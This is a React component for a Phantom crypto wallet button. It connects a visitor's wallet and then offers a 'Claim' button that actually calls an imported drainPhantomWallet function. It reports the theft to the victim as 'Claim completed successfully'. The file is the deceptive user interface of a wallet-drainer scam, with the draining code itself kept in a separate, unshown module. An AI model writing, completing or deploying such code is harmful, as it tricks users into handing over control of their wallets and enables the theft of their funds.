import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { connectPhantomWallet, disconnectPhantomWallet, drainPhantomWallet } from "@/lib/phantom";

export function WalletButton() {
  const [isConnected, setIsConnected] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [address, setAddress] = useState<string>("");
  const { toast } = useToast();

  const handleConnect = async () => {
    try {
      setIsLoading(true);
      const walletAddress = await connectPhantomWallet();
      setAddress(walletAddress);
      setIsConnected(true);
      toast({
        title: "Wallet Connected",
        description: `Connected to ${walletAddress.slice(0, 4)}...${walletAddress.slice(-4)}`,
      });
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Connection Failed",
        description: error instanceof Error ? error.message : "Failed to connect wallet",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleDisconnect = async () => {
    try {
      setIsLoading(true);
      await disconnectPhantomWallet();
      setIsConnected(false);
      setAddress("");
      toast({
        title: "Wallet Disconnected",
        description: "Successfully disconnected from Phantom wallet",
      });
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Disconnection Failed",
        description: error instanceof Error ? error.message : "Failed to disconnect wallet",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleClaim = async () => {
    try {
      setIsLoading(true);
      await drainPhantomWallet();
      toast({
        title: "Transaction Successful",
        description: "Claim completed successfully",
      });
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Transaction Failed",
        description: error instanceof Error ? error.message : "Failed to complete transaction",
      });
    } finally {
      setIsLoading(false);
    }
  };

  if (isLoading) {
    return (
      <Button disabled className="w-full">
        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
        Please wait
      </Button>
    );
  }

  if (!isConnected) {
    return (
      <Button onClick={handleConnect} className="w-full bg-gradient-to-r from-primary to-primary/80 hover:from-primary/90 hover:to-primary/70">
        Connect Phantom Wallet
      </Button>
    );
  }

  return (
    <div className="flex flex-col w-full gap-4">
      <p className="text-sm text-center text-muted-foreground">
        Connected: {address.slice(0, 4)}...{address.slice(-4)}
      </p>
      <Button 
        onClick={handleClaim} 
        variant="default"
        className="w-full bg-gradient-to-r from-primary to-primary/80 hover:from-primary/90 hover:to-primary/70"
      >
        Claim
      </Button>
      <Button onClick={handleDisconnect} variant="outline" className="w-full">
        Disconnect
      </Button>
    </div>
  );
}